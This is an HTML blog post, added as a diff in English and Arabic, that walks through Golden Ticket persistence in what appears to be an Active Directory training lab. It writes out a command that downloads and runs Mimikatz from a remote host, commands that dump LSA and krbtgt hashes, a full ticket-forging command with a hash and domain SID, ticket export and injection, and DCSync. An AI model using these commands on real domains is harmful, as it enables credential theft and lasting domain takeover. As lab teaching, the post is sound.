@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Persistence - Golden Ticket | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Persistence - Golden Ticket</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-09-15</span>
+</div>
+<h1 class="post-title">Persistence - Golden Ticket</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In the previous article, we achieved access to the Domain Controller. The Domain Controller is the machine that controls everything in the Active Directory environment. But how do we establish persistence so that at any time we can return and access this machine even from a low-privileged user account?</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Extract the krbtgt Hash Using Mimikatz</h3>
+<p>First, we need to load Mimikatz on the Domain Controller and dump all the password hashes. The hash we are specifically interested in is the one belonging to the <strong>krbtgt</strong> account, as this is what we need to forge Golden Tickets.</p>
+<p>Load Mimikatz into memory using the following command:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
+</code></pre>
+<p>Then execute the following command to dump all hashes from the LSA:</p>
+<pre><code class="language-powershell">Invoke-Mimikatz -Command '&quot;token::elevate&quot; &quot;lsadump::lsa /patch&quot;'
+</code></pre>
+<p>This elevates our token and then dumps all the password hashes from the domain, including the critical krbtgt hash.</p>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/10.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Gather the Golden Ticket Requirements</h3>
+<p>The Golden Ticket technique has the following prerequisites:</p>
+<ol>
+<li>The <strong>NTLM Hash</strong> of the <code>krbtgt</code> user</li>
+<li>The <strong>Domain name</strong></li>
+<li>The <strong>SID</strong> of the domain</li>
+</ol>
+<p>We already have the krbtgt NTLM hash from the previous step. Now we need to collect the domain name and domain SID.</p>
+<p>To get the domain name, we use the PowerView tool:</p>
+<pre><code class="language-powershell">Get-NetDomain
+</code></pre>
+<p>To get the domain SID, we run:</p>
+<pre><code class="language-powershell">Get-DomainSID
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/11.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Generate and Inject the Golden Ticket</h3>
+<p>Now that we have all the required information, we open a PowerShell session, load Mimikatz, and execute the following command to generate the Golden Ticket and inject it directly into the current session using the <code>/ptt</code> (pass-the-ticket) flag:</p>
+<pre><code>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /ptt
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/2.png" alt="Step 3" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/3.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Verify the Ticket Was Injected</h3>
+<p>To verify that the ticket was successfully injected into our session, we run the <code>klist</code> command:</p>
+<pre><code>klist
+</code></pre>
+<p>We can see that the ticket has been injected and it will remain valid until the year 2032.</p>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/4.png" alt="Step 5" loading="lazy"></figure>
+<h3>What Happens If We Close the PowerShell Window?</h3>
+<p>If we accidentally close the PowerShell window and open a new one, is the ticket lost? No -- the ticket persists in the logon session.</p>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/5.png" alt="Step 6" loading="lazy"></figure>
+<h3>Saving the Golden Ticket to a File for Portability</h3>
+<p>If you want to use this ticket on a different machine, do you have to run the entire generation command again? Yes, unless you save the ticket to a file. Mimikatz allows you to export the ticket to a <code>.kirbi</code> file instead of injecting it directly, using the <code>/ticket:</code> parameter:</p>
+<pre><code>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /ticket:C:\Users\student407\Desktop\goldTick.kirbi
+</code></pre>
+<p>Now the ticket is saved to a file. You can transfer this file to any other machine and inject it using Mimikatz with the following command:</p>
+<pre><code>kerberos::ptt &quot;C:\Users\student407\Desktop\goldTick.kirbi&quot;
+</code></pre>
+<h2>What Can You Do With a Golden Ticket?</h2>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/6.png" alt="Step 7" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/7.png" alt="Step 8" loading="lazy"></figure>
+<h3>Browsing Shared Files</h3>
+<p>With a Golden Ticket, you can browse the shared files on the Domain Controller or any machine joined to the domain:</p>
+<pre><code class="language-powershell">dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/8.png" alt="Step 9" loading="lazy"></figure>
+<h3>DCSync Attack</h3>
+<p>You can also perform a <strong>DCSync attack</strong>. The idea behind this attack is that you can extract the NTLM hash for any user in the domain. We execute it using Mimikatz.</p>
+<p>For example, to extract the NTLM hash of the Domain Administrator:</p>
+<pre><code>lsadump::dcsync /user:dcorp\Administrator
+</code></pre>
+<p>After obtaining the hash, you can then perform a <strong>Pass The Hash</strong> attack to authenticate as the Domain Administrator. This technique was covered in a previous article -- refer back to it if you are unfamiliar with Pass The Hash.</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/9.png" alt="Step 10" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>مقدمة:</p>
+<p>في المقالة السابقة وصلنا الى جهاز Domain Controller طبعا جهاز ال Domain Controller هو الجهاز المتحكم في كل شي في ال Active Directory لكن كيف راح نثبت اختراقنا بحيث ف اي وقت اقدر ارجع وادخل الى هذا الجهاز بصلاحية مستخدم محدود</p>
+<p>الشرح:</p>
+<p>اول شي راح نسوي Load ل اداة Mimikatz على جهاز Domain Controller ونسحب لجميع الهاشات الموجودة لكن الهاش اللي يهمنا اللي هو الهاش الخاص بالمستخدم krbtgt</p>
+<p>راح نسوي Load عن طريق هذا الامر:</p>
+<p>iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)</p>
+<p>بعد كذا ننفذ هذا الامر:</p>
+<p>Invoke-Mimikatz -Command '"token::elevate" "lsadump::lsa /patch"'</p>
+<p>طيب الان راح ننفذ تكنيك Golden Ticket طبعا هذا التكنيك له متطلبات:</p>
+<p>1- الـNTLM Hash الخاص في المتسخدم krbtgt</p>
+<p>2- اسم الـDomain</p>
+<p>3- الـSID الخاص في الدومين</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/10.png" alt="Step 1" loading="lazy"></figure>
+
+<p>فقط اللي ناقصنا من المتطلبات اسم ال Domain و ال SID الخاص في الدومين</p>
+<p>راح نقدر نتسخرج اسم الـDomain عن طريق اداة PowerView عن طريق هذا الامر:</p>
+<p>Get-NetDomain</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/11.png" alt="Step 2" loading="lazy"></figure>
+
+<p>والـSid الخاص بالدومين راح نستخرجه عن طريق هذا الامر:</p>
+<p>Get-DomainSID</p>
+<p>الان جمعنا المتطلبات كل اللي علينا نفتح جلسة PowerShell ونشغل اداة Mimikatz وننفذ هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/2.png" alt="Step 3" loading="lazy"></figure>
+
+<p>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /ptt</p>
+<p>الان ننفذ الامر klist عشان نشوف هل فعلا انحقنت الـTicket او لا</p>
+<p>زي مانلاحظ انه انحقن الـTicket وراح يكون صالح الى سنة 2032 :)</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/3.png" alt="Step 4" loading="lazy"></figure>
+
+<p>طبعا نفترض لو انه بالغلط قفلنا صفحة البورشيل واستخدمنا وحده جديدة هل راح تروح الـTicket ؟</p>
+<p>لا</p>
+<p>طيب لو بستخدم هذي التيكت في جهاز ثاني هل راح اروح انفذ نفس الامر؟</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/4.png" alt="Step 5" loading="lazy"></figure>
+
+<p>اي بس في طريقة انه تخلي اداة ال Mimikatz تعطيك ال Ticket في ملف عن طريق هذا الامر:</p>
+<p>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /ticket:C:\Users\student407\Desktop\goldTick.kirbi</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/5.png" alt="Step 6" loading="lazy"></figure>
+
+<p>الان الـTicket انحفظت في ملف الان اقدر انقل الملف الى اي جهاز واحقن هذا الملف عن طريق اداة Mimikatz</p>
+<p>راح نحقن ملف الـTicket عن طريق هذا الامر:</p>
+<p>kerberos::ptt "C:\Users\student407\Desktop\goldTick.kirbi"</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/6.png" alt="Step 7" loading="lazy"></figure>
+
+<p>طيب ايش اقدر اسوي اللحين مدام انه عندي Golden Ticket؟</p>
+<p>ممكن نتصفح ال Share Files الخاصة بالـDomain Controller او اي جهاز من الاجهزة مرتبط بالـDomain عن طريق هذا الامر:</p>
+<p>dir \\dcorp-dc.dollarcorp.moneycorp.local\C$</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/7.png" alt="Step 8" loading="lazy"></figure>
+
+<p>او ممكن ننفذ dcsync attack دام انه معنا Golde Ticket بس ايش هذا الـAttack؟</p>
+<p>هذا الـAttack فكرته انه ممكن تستخرج NTLM HASH لي اي مستخدم موجود على الدومين طبعا راح ننفذه عن طريق اداة Mimikatz</p>
+<p>راح اجرب استخرج NTLM hash الخاص بالـDomain Administrator عن طريق هذا الامر</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/8.png" alt="Step 9" loading="lazy"></figure>
+
+<p>lsadump::dcsync /user:dcorp\Administrator</p>
+<p>وبعد كذا ممكن ننفذ تكنينك Pass The Hash عشان نسجل دخول بالـDomain Administrator وانا شرحت هذا التكنيك في المقالة السابقة ياليت ترجع تشوف التكنيك لو ماتعرفه</p>
+<p>وبكذا وصلنا الى نهاية المقالة</p>
+<figure class="article-img"><img src="../assets/images/presistence-golden-ticket/9.png" alt="Step 10" loading="lazy"></figure>
+
+<p>اتمنى نالت على اعجابكم 3&gt;</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
